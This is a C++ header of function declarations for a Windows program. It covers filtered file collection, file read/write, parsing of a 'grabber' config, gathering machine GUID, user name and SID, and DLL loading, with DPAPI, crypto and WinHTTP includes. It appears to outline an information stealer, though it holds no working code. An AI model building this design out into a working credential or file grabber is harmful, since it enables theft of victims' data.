#pragma once
#include "vars.h"
#include "functions.h"

/** 
* This increases compile time a bit but contains all of the various
* includes needed by the other files, since virtually every file includes
* utils.h
*/
#include <iostream>
#include <fstream> 
#include <sstream>
#include <cstdio>
#include <windows.h>
#include <wincrypt.h>
#include <dpapi.h>
#include <shlwapi.h>
#include <Shlobj.h>
#include <winhttp.h>
#include <sddl.h>
#include <algorithm>
#include <vector>
#include <unordered_map>
#include <string>
#include <stack>
#include <regex>
#include <algorithm>
#include "bcrypt.h"
#include <iomanip>

using namespace std;

/*****************************
* FILE AND FOLDER OPERATIONS *
*****************************/
vector<wstring> getPaths(wstring basePath, vector<wstring> filters,
    vector<wstring> exclusions, int sizeLimit, bool recurse, int searchType);

// Converts %userprofile% to a full path
wstring parseFolderShortcut(wstring path); 

// File / folder checks based on config
bool isUnderSizeLimit(WIN32_FIND_DATAW fileData, int maxSizeKB);
bool isMatch(wstring path, vector<wstring> filter);
bool isUnderSizeLimit(WIN32_FIND_DATAW fileData, int maxSizeKB);

// File read/write
vector<char> readBytesFromFile(wstring filepath);
int writeBytesToFile(vector<char> bytes, wstring filePath);
int writeToFile(wstring contents, wstring filePath);


/*****************************
*     VARIOUS UTILITIES      *
*****************************/

// Random string generator
wstring randString(size_t length);

// Data format interchange
void appendWStringToVector(vector<char>& vec, const wstring& wstr);
void appendBytesToVector(vector<char>& vec, LPVOID lpBuffer, DWORD dwSize);

// Individual config line item parsers (NOTE - config parsing itself is in startuptasks.h/cpp)
vector<wstring> parseGrabberConfigLineItems(wstring data, const wchar_t delims[]);
wstring stripLib(wstring orig);

/**********************************
* USER AND MACHINE DATA GATHERING *
**********************************/

wstring getMachineGUID();
wstring getUserName();
wstring getUserSID();


/*****************************
*       DLL OPERATIONS       *
*****************************/

HMODULE loadDLLFromDisk(wstring dllPath);
int loadWindowsDLLs(unordered_map<wstring, HMODULE>& mHandles, wstring dllName);
bool unloadDLLs(unordered_map<wstring, HMODULE>& mHandles);
bool unloadDLL(HMODULE hMod);











